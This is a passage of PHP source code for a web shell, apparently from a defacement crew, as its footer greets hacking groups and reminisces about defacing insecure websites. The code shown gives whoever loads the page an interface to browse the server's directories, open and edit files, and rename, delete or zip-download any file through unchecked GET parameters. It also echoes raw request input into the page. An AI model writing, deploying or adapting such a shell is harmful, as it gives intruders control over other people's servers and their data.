        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            $fd = fopen($_GET['open']);
	    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>";
	    else {
            while(!feof())
            {
                echo htmlspecialchars(fgets($fd));
            }
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" class="own" id="spacing"/>
        </form>
    <?php
}

//Rename

else if(isset($_GET['rename']))
{
    if(isset($_GET['to']) && isset($_GET['rename']))
    {
        if(rename($_GET['rename'],$_GET['to']) == FALSE)
        {
            ?>
            <big><p class="blink">Cant rename the file specified! Please check the file-name , Permissions and try again!</p></big>
            <?php
        }
        else
        {
            ?>
            <big><p class="blink">File Renamed , Return <a href="<?php echo $self;?>">Here</a></p></big>
            <?php
        }
    }
    else
    {
?>
    <form method="GET" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="rename" /></td>
            </tr>
            <tr>
                <td>To </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="to" /></td> 
            </tr>
        </table>
        <input type="Submit" value="Rename :D" class="own" style="margin-left: 160px;padding: 5px;"/>
        </form>   
    <?php
    }
}
// No request made
// Display home page

else
{
    echo "    </center>";
    $dir = getcwd();
    if(isset($_GET['dir']))
    {
        $dir = $_GET['dir'];
    }
    ?>
    <table id="margins">
    <tr>
        <form method="GET" action="<?php echo $self;?>">
        <td width="100">PWD</td><td width="410"><input name="dir" class="cmd" id="mainInput" value="<?php echo $dir;?>"/></td>
        <td><input type="submit" value="GO" class="own" /></td>
        </form>
    </tr>
    </table>
    
    <table id="margins" class="files">
    <tr>
        <th class="header" width="500px">Name</th>
        <th width="100px" class="header">Size</th>
        <th width="100px" class="header">Permissions</th>
        <th width="100px" class="header">Delete</th>
        <th width="100px" class="header">Rename</th>
	<th width="100px" class="header">Zip</th>
    </tr>
    <?php
    
    if(isset($_GET['delete']))
    {
        if(unlink(($_GET['delete'])) == FALSE)
        {
            echo "<p id='margins' class='alert_red'>Could Not Delete the FILE Specified</p>";
        }
    }

    else if(isset($_GET['delete_dir']))
    {
        if(rmdir(($_GET['delete'])) == FALSE)
        {
            echo "<p id='margins' class='alert_red'>Could Not Delete the DIRECTORY Specified</p>";
        }
    }

    if(is_dir($dir))
    {
        $handle = opendir($dir);
        if($handle != FALSE)
        {
        if($dir[(strlen($dir)-1)] != $SEPARATOR){$dir = $dir.$SEPARATOR;}
        while (($file = readdir($handle)) != false) {
                if ($file != "." && $file != "..")
        	{
		
		$color = 'red';
		if(is_readable($dir.$file))
		{
			$color = 'yellow';
		}
		if(is_writable($dir.$file))
		{
			$color = 'green';
		}
		
                if(is_dir($dir.$file))
                {
                    ?>
                    <tr>
                    <td class='dir'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'><b>/<?php echo $file ?></b></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(dirSize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete_dir=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
		    <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                <?php
                }
                //Its a file 
                else
                {
                    ?>
                    <tr>
                    <td class='file'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(filesize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
	            <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                    <?php
                }
            }
        }
        closedir($handle);
        }
    }
    else
    {
        echo "<p class='alert_red' id='margins'>Permission Denied</p>";
    }
    ?>
    </table>
    <?php
  
}
//------------------------------------------------------------------------------------------------
?>

<?php
}
// End Shell
//-------------------------------------------------------------------------------------------------
?>
  <div class="clearfooter"></div>
</div>

<div class="end" id='footer' style="margin-top: 20px;">
<p align="center"><b>(C) Copyright lionaneesh [All rights reserved]</b><br />
(: <a href="http://twitter.com/lionaneesh">Follow Me</a> | <a href="http://facebook.com/lionaneesh">Facebook</a> :) <br />
\m/ <b>Greetz to</b> : LuCky , Aasim Bhai aKa R00tD3vil , and all ICA and Indishell Members! We'll Always rock \m/<br />
All I remember were those lonely nights when I was defacing those insecure websites
</p>
</div>

</body>
</html>
